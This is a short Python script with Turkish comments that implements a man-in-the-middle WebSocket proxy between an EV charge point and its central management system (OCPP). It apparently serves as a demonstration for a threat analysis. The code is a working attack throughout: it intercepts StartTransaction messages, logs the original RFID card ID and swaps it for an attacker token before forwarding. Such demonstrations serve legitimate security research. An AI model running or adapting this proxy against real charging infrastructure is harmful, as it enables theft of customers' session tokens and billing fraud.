import asyncio
import websockets
import json

# [cite: 5] Tehdit: MITM saldırıları ve Veri Manipülasyonu
TARGET_CSMS_URI = "ws://localhost:9000"
MITM_PORT = 9001

async def proxy_handler(client_ws, path):
    print(f"[MITM] Kurban (CP) bağlandı. Trafik dinleniyor...")
    
    # Gerçek CSMS'e saldırgan olarak bağlan
    async with websockets.connect(TARGET_CSMS_URI) as csms_ws:
        
        async def forward_to_csms():
            async for message in client_ws:
                data = json.loads(message)
                # OCPP Mesajı: [2, "msgId", "StartTransaction", {payload}]
                
                #  Oturum tokenlarının çalınarak manipüle edilmesi
                if data[2] == "StartTransaction":
                    original_tag = data[3].get("idTag")
                    print(f"[MITM] YAKALANDI! Orijinal Kart ID: {original_tag}")
                    
                    # VERİ MANİPÜLASYONU: Kart ID'sini değiştiriyoruz
                    data[3]["idTag"] = "HACKER_TOKEN_999"
                    new_message = json.dumps(data)
                    print(f"[MITM] DEĞİŞTİRİLDİ! Yeni Kart ID: HACKER_TOKEN_999 -> CSMS'e gönderiliyor.")
                    await csms_ws.send(new_message)
                else:
                    # Diğer mesajları olduğu gibi ilet
                    print(f"[MITM] Mesaj olduğu gibi iletiliyor: {data[2]}")
                    await csms_ws.send(message)

        async def forward_to_cp():
            async for message in csms_ws:
                # CSMS'den gelen cevabı CP'ye ilet
                await client_ws.send(message)

        # İki yönlü trafiği başlat
        await asyncio.gather(forward_to_csms(), forward_to_cp())

async def main():
    print(f"[MITM] Saldırı sunucusu başlatıldı (ws://localhost:{MITM_PORT})...")
    print("[MITM] Şarj istasyonu (CP) buraya bağlanacak, biz de CSMS'e ileteceğiz.")
    async with websockets.serve(proxy_handler, "localhost", MITM_PORT):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())